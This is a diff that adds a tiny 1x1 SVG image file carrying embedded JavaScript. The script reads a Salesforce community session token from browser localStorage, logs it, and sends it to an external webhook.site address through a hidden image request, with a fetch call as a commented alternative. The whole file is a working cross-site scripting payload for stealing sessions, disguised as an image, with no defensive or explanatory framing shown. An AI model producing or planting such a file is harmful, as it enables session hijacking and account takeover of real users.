@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script type="text/javascript">
+    //<![CDATA[
+      // Get Salesforce token from Local Storage
+      var sf_token = localStorage.getItem('$AuraClientService.token$siteforce:communityApp');
+      console.log("Salesforce token is: " + sf_token);
+      
+      // Send token to webhook via GET request
+      if (sf_token) {
+        var webhookUrl = 'https://webhook.site/b0930745-f9c1-4b40-931a-cd1084cdce24';
+        var img = document.createElement('img');
+        img.src = webhookUrl + '?token=' + encodeURIComponent(sf_token);
+        img.style.display = 'none';
+        document.body.appendChild(img);
+        
+        // Alternative method using fetch (might be blocked by CORS)
+        // fetch(webhookUrl + '?token=' + encodeURIComponent(sf_token), {mode: 'no-cors'});
+      }
+    //]]>
+  </script>
+</svg>
